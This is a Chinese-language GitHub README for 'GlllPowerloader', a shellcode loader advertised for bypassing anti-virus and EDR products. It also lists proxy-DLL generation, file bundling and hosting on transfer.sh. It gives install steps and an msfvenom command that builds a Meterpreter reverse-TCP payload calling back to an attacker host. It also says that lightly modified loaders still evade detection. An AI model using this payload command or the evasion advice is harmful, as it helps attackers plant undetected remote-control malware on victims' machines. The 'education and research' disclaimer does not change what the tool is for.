# GlllPowerloader


- [1.前言](#1前言)

- [2.功能](#2功能)

- [3.使用](#3使用)
  - [0x01.环境安装](#0x01环境安装)
  
  - [0x02.shellcode loader的使用](#0x02shellcode-loader的使用)
  
  - [0x03.Automation\_loader](#0x03automation_loader)
  
  - [0x04.文件格式转换](#0x04文件格式转换)
  
  - [0x05.自动化生成代理DLL](#0x05自动化生成代理dll)
  
  - [0x06.文件捆绑和上传](#0x06文件捆绑和上传)
  
    
  
- [4.更新](#4更新)

- [5.免责声明](#5免责声明)

- [6.结语](#6结语)

# 1.前言

* 视频讲解：https://www.bilibili.com/video/BV1RK411z7XA/  欢迎点赞关注

- 刚开始可以免杀主流杀软的，不过后面肯定会被乱杀，主要目的是学习恶意代码和自动化


# 2.功能



|       功能       |                描述                |
| :--------------: | :--------------------------------: |
|   1.免杀加载器   | 各种方式加载shellcode，绕过AV/EDR  |
|  2.文件格式转换  |    Windows中文件格式之间的转换     |
| 3.自动化文件托管 | 将文件托管到：https://transfer.sh/ |



# 3.使用

## 0x01.环境安装

您必须下载并安装以下环境：

1.Mingw64(C/C++)的编程环境：https://github.com/niXman/mingw-builds-binaries/releases/download/12.2.0-rt_v10-rev2/x86_64-12.2.0-release-posix-seh-msvcrt-rt_v10-rev2.7z

解压完以后，将bin目录添加至环境变 量即可

使用Git下载项目

```
git clone https://github.com/INotGreen/GlllPowerloader.git
cd GlllPowerLoader-master
pip install -r requirements.txt
start.bat
```



## 0x02.shellcode loader的使用

大部分已经不能免杀了，不过稍微改一下基本上都能过，建议使用无阶段的shellcode（Stageless）

Metasploit:

```
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=192.168.1.0 LPORT=4488 -f raw -o payload.bin
```

## 0x03.Automation_loader



# 4.更新

[+] 2022年12.21，Powerloader发布

[+]2023 年11.15-19， 删除冗余的功能，优化代码（之前的版本涉及语言安装环境太多了，使用太麻烦，为了简便就留C/C++的加载器）

免杀加载器正在更新中。。。


# 5.免责声明

该工具仅用于网络安全教育和研究，禁止用于非法途径，我对您由使用或传播等由此软件引起的任何行为和/或损害不承担任何责任。您对使用此软件的任何行为承担全部责任，并承认此软件仅用于教育和研究目的。下载本软件或软件的源代码，您自动同意上述内容。

# 6.致谢

刚开始学习了他的编码方式，这非常有意义：https://github.com/icyguider/Shhhloader
